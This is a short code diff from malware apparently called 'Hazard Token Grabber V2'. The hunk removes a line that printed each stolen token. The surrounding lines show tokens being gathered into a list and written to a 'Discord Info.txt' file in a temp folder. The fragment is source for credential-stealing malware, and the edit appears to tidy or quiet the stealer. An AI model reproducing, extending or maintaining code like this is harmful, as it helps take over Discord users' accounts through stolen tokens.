@@ -339,7 +339,6 @@ class Hazard_Token_Grabber_V2:
                                     if token in self.tokens:
                                         continue
                                     self.tokens.append(token)
-                                    print(token)
               
     def neatifyTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
